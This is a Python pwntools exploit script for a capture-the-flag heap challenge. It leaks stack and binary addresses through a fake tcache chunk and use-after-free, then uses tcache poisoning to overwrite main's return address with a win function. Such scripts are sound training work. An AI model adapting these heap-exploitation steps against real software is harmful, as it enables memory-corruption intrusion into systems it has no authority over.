#!/usr/bin/env python

from pwn import *

get_flag = False
chall_name = '14.1'

context.arch = "amd64"

def run_with_gdb(p):
    gdb.attach(p,'''
    set follow-fork-mode parent
    b *main
    #b *main+1768
    #commands
    #x/8gx $rax-0x8
    #end''') # b *+121
    run_exploit(p, False)
    # 8xg

def run_commands_list(commands, p, print_command):
    for command in commands:
        if print_command and not get_flag:
            print('COMMAND: ', command)
            input("")
        print_send_print(command, p)

def print_send_print(line_to_send, p):
    try:
        p.sendline(line_to_send)
        if get_flag:
            print(p.recvrepeat(1).decode())
        else:
            print(p.recvrepeat(0.2).decode())
    except:
        print('Exception in \'print_send_print\'')
        pass
def get_address_leak_from_output(output):
    #print(output)
    start_search_string = b'Data: '
    leak_start = output.find(start_search_string) + len(start_search_string)
    leak_ends = output.find(b'\n', leak_start)
    leaked_bytes = output[leak_start:leak_ends]
    return adjust_bytes_leaked_address(leaked_bytes)
    #return int(output[secret_start:secret_ends], 16)

def adjust_bytes_leaked_address(byte_address):
    bytearray_address = bytearray(byte_address)
    bytearray_address.reverse()
    address = int(bytearray_address.hex(), 16)
    return address

def get_secret_from_output(output):
    start_search_string = 'Data: '
    secret_start = output.find(start_search_string) + len(start_search_string)
    secret_ends = output.find('\n', secret_start)
    return output[secret_start:secret_ends]

def run_exploit(p, debug):
    if debug:
        run_with_gdb(p)

    welcome_message = p.recvrepeat(1).decode()
    print(welcome_message)

    """
    1. leak a stack address (bypass aslr)
        1.1 use the buffer overflow in stack_scanf to create a fake chunk in stack_free
        1.2 put the fake chunk in tcache using stack_free func
        1.3 get a pointer to this fake chunk
        1.4 use the use after free vuln to echo the address of the chunk, the stack address
    2. calculate wheres the return of main stored in the stack
        2.1 get the distance between the leak and the return address of main (retaddr)
        2.2 calculate
    3. leak a binary address (bypass pie)
        3.1 create and free a chunk with the same size that echo uses (keeps the pointer, use after free)
        3.1 poison tcache with a chunk that i control with the same size that echo uses (0x31)
        3.2 echo uses the chunk that i still have a pointer to store data about itself (the string '/bin/echo')
        3.2 echo now will echo data about itself, the address of the string '/bin/echo' stored in the binary
        3.4 with /bin/echo address, we can calculate anything in the binary
    4. pwn
        4.1 calculate the address of the function main with the offset in the binary + leaked /bin/echo address
        4.2 calculate the ret address of main in the stack 
        4.3 overwrite the ret address with the address of win
    """

    ########### STAGE 1 - LEAKING A STACK ADDRESS AND BYPASS ASLR #################
    overflow_to_stack_free = b'A' * (64 - 8) # overflowing until stack_free (64) - 8 (because metadata of chunk starts before the chunk itself)
    fake_chunk_metadata_size = p64(0x0000000000000021) # 0x21 for no particular reason

    commands = [
            b'stack_scanf ' + overflow_to_stack_free + fake_chunk_metadata_size + p64(0x0) + p64(0x0), # overflowing and creating metadata to represent a fake heap chunk
            b'stack_free', # freeing the fake chunk created in the stack and putting him on tcache
            b'malloc 0 21', # getting a pointer for the fake chunk
            b'malloc 1 21', # creating a helper chunk that i will use for leak a address
            b'free 0', # freeing in a nice order to get the leak
            b'free 1'
    ]
    run_commands_list(commands, p, True)

    input("Press enter to pwn")
    p.sendline('echo 1 0') # puts the freed chunk will print the 'NEXT' key of the chunk
    stack_leak = get_address_leak_from_output(p.recvrepeat(1))
    ret_address = stack_leak + 0x58 # the distance between the leak and main ret address

    ########### STAGE 2 - LEAK A STRING ADDRESS FROM BINARY TO BYPASS PIE #################
    commands = [
            b'malloc 0 32', # 32 its the size that echo uses when malloc
            b'free 0' # put the chunk in tcache and keeping the pointer
        ]
    run_commands_list(commands, p, False)

    # here echo function will get our 0 chunk for his internal data, when we
    # echo this chunk, we will echo data about echo itself
    p.sendline('echo 0 0')
    bin_echo_leak = get_address_leak_from_output(p.recvrepeat(1))
    # setting base address and bypassing PIE
    elf = ELF('/challenge/' + chall_name)
    #elf = ELF('./' + chall_name)
    bin_echo_address = next(elf.search(b'/bin/echo'))
    elf.address = bin_echo_leak - bin_echo_address
    # win got some null bytes in the start of the function, so we bypass that by jumping
    # after the "you win, here is the flag" part
    win_address = p64(elf.sym['win'] + 0x14)

    print('Stack leak:', hex(stack_leak))
    print('Ret address of main:', hex(ret_address))
    print('/bin/echo address: ', hex(bin_echo_leak))
    print('Win address:', hex(elf.sym['win'] + 0x14))
    input("Press enter to pwn again")

    ########### STAGE 3 - OVERWRITE RET OF MAIN WITH WIN AND PROFIT #################
    # We overwrite the saved return address of main (previously pointing to _libc_blabla)
    # with the address of WIN.
    # When main finish, will ret to win and print the flag
    commands = [
                b'malloc 0 100',
                b'malloc 1 100',
                b'free 1',
                b'free 0',
                # corrupting the chunk '1' with the stack ret pointer by scanfing to the chunk '0' after he was freed
                b'scanf 0 ' + p64(ret_address) + b'ZZZZZZZZ' + b'BBBBBBBB',
                b'malloc 0 100', 
                b'malloc 0 100',
                # overwriting the ret of main with win_address
                b'scanf 0 ' + win_address
                #b'quit'
                ]

    run_commands_list(commands, p, True)
    p.interactive()
    p.close()

if get_flag:
    ssh_connection = ssh(host='college',user='hacker')
    process_full_path = '/challenge/' + chall_name
    p = ssh_connection.run(process_full_path)
    run_exploit(p, False)
    ssh_connection.close()
else:
    p = process('./' + chall_name)
    run_exploit(p, True)
